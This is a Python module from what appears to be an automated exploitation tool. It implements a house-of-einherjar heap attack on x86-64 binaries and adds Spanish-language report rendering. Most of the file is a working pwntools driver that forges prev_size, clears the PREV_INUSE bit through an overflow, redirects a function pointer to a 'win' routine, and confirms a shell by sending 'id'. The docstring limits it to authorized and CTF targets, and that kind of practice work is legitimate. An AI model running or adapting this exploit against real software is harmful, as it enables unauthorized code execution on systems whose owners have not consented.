"""House-of-einherjar, verified by execution.

Einherjar abuses BACKWARD CONSOLIDATION: when a chunk is freed with its PREV_INUSE bit clear, the
allocator reads its prev_size and merges with the previous chunk at (chunk - prev_size). By forging
prev_size (and clearing PREV_INUSE, classically via an off-by-one null overflow), that "previous
chunk" becomes a FAKE chunk at an attacker-chosen address, so the freed chunk lands there and the
next malloc returns it -> arbitrary write -> hijack a function pointer -> shell.

A faithful glibc einherjar also needs tcache-bypass and passes a `chunksize(p)==prev_size(next)`
check; binoracle verifies the technique against a target whose allocator reproduces the backward-
consolidation condition, and degrades honestly otherwise. The chain uses the address wraparound that
reaches a fake chunk above the heap. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (hoe driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
heap = sym.get("heap") or sym.get("arena")
handler = sym.get("handler") or sym.get("fnptr") or sym.get("hook")
win = sym.get("win")
if heap is None or handler is None or win is None:
    print("NOT_APPLICABLE (no einherjar shape: need heap+handler+win symbols)"); sys.exit(1)

M = (1 << 64) - 1
MARK = b"BINORACLE_HOE_PWNED"

def attempt(size_a):
    # B's header is at heap+size_a; its prev_size at heap+size_a, its size at heap+size_a+8. Forge
    # prev_size so (B_hdr - prev_size) = &handler-0x10 (the fake chunk), and clear PREV_INUSE (even
    # size). After free(B) the freed chunk is the fake one; the next malloc returns handler.
    B_hdr = heap + size_a
    fake = handler - 0x10
    prev_size = (B_hdr - fake) & M
    pad = B_hdr - (heap + 0x10)          # overflow from A's data (heap+0x10) to B's prev_size
    if pad < 0:
        return False
    overflow = b"A" * pad + p64(prev_size) + p64(size_a)   # size_a is even -> PREV_INUSE clear
    io = None
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(overflow); time.sleep(0.15)
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(p64(win)); time.sleep(0.25)
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.1)
        except Exception: pass
        io.close()
        return (MARK in out) or (b"uid=" in out)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
        return False

for size_a in (0x30, 0x20, 0x40, 0x50, 0x60):
    if attempt(size_a):
        print("VERIFIED size_a=%#x heap=%#x handler=%#x win=%#x" % (size_a, heap, handler, win))
        sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autohoe(binary: str) -> dict:
    """House-of-einherjar verificado por ejecucion (contra un asignador que reproduce la
    consolidacion hacia atras). Necesita la forma de practica (heap/handler/win). Docker o nativo."""
    res = run_driver(binary, _DRIVER, ".binoracle_hoe.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"house-of-einherjar (consolidacion hacia atras): chunk liberado aterriza en "
                   f"direccion arbitraria -> escritura -> hijack -> shell verificada ({eng})"
                   if res.get("verified")
                   else f"house-of-einherjar: no verificado ({eng}) (sin la forma HoE o timing)")
    return res


def render_hoe(r: dict) -> str:
    out = ["## Auto house-of-einherjar (consolidacion hacia atras, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: el einherjar de glibc requiere ademas esquivar tcache y pasar el chequeo "
               "chunksize(p)==prev_size; la verificacion usa un asignador que reproduce la "
               "consolidacion hacia atras._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
